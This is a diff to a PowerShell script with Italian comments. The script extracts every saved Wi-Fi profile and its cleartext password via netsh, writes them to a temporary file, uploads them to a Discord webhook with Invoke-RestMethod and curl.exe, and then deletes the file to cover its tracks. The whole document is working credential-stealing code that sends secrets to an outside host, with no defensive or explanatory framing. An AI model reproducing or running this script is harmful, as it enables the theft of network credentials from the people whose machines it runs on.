@@ -4,52 +4,59 @@ $wifiProfiles = (netsh wlan show profiles) |
     Select-String "\:(.+)$" | 
     ForEach-Object {
         $name = $_.Matches.Groups[1].Value.Trim()
-        $profileInfo = netsh wlan show profile name="$name" key=clear
-        $pass = ($profileInfo | Select-String "Key Content\W+\:(.+)$").Matches.Groups[1].Value.Trim()
+        $pass = (netsh wlan show profile name="$name" key=clear | 
+                 Select-String "Key Content\W+\:(.+)$").Matches.Groups[1].Value.Trim()
         
+        # Restituisci il profilo Wi-Fi e la password
         [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass }
-    } | 
-    Format-Table -AutoSize | 
-    Out-String 
+    }
 
-# Salva i profili Wi-Fi e le password in un file temporaneo
-$env:TEMP\wifi-passwords.txt
-Out-File -FilePath "$env:TEMP\wifi-passwords.txt" -InputObject $wifiProfiles
+# Crea il messaggio per Discord
+$message = "Ecco le password dei profili Wi-Fi salvati:`n`n"
+foreach ($profile in $wifiProfiles) {
+    $message += "Profilo: $($profile.PROFILE_NAME)`nPassword: $($profile.PASSWORD)`n`n"
+}
+
+# Salva i profili e le password in un file temporaneo
+$outputFile = "$env:TEMP\wifi-passwords.txt"
+$message | Out-File -FilePath $outputFile -Encoding utf8
 
 ############################################################################################################################################################
 
 # Funzione per caricare le password su Discord
 function Upload-Discord {
-    [CmdletBinding()]
     param (
-        [parameter(Position=0, Mandatory=$True)] [string]$file,
-        [parameter(Position=1, Mandatory=$False)] [string]$text
+        [string]$WebhookUrl,
+        [string]$Message,
+        [string]$FilePath
     )
 
-    $hookurl = "WEBHOOK_DISCORD"  # Sostituisci con il tuo URL Webhook Discord
     $Body = @{
         'username' = $env:username
-        'content'  = $text
+        'content'  = $Message
     }
 
     # Invia il messaggio di testo
-    if (-not [string]::IsNullOrEmpty($text)) {
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
+    if (-not [string]::IsNullOrEmpty($Message)) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $WebhookUrl -Method Post -Body ($Body | ConvertTo-Json)
     }
 
     # Carica il file delle password
-    if (-not [string]::IsNullOrEmpty($file)) {
-        curl.exe -F "file1=@$file" $hookurl
+    if (Test-Path $FilePath) {
+        curl.exe -F "file1=@$FilePath" $WebhookUrl
     }
 }
 
 # Carica le password su Discord
-if (Test-Path "$env:TEMP\wifi-passwords.txt") {
-    Upload-Discord -file "$env:TEMP\wifi-passwords.txt" -text "Ecco le password dei profili Wi-Fi salvati:"
+$discordWebhookUrl = "WEBHOOK_DISCORD"  # Sostituisci con il tuo URL Webhook Discord
+if (-not [string]::IsNullOrEmpty($discordWebhookUrl)) {
+    Upload-Discord -WebhookUrl $discordWebhookUrl -Message "Ecco le password dei profili Wi-Fi salvati:" -FilePath $outputFile
 }
 
 ############################################################################################################################################################
 
-# Opzionale: Visualizza un messaggio indicante la fine dell'operazione
-Write-Host "Le password Wi-Fi sono state inviate a Discord."
+# Pulizia dei file temporanei (opzionale)
+Remove-Item $outputFile -ErrorAction SilentlyContinue
 
+# Visualizza un messaggio indicante la fine dell'operazione
+Write-Host "Le password Wi-Fi sono state inviate a Discord."
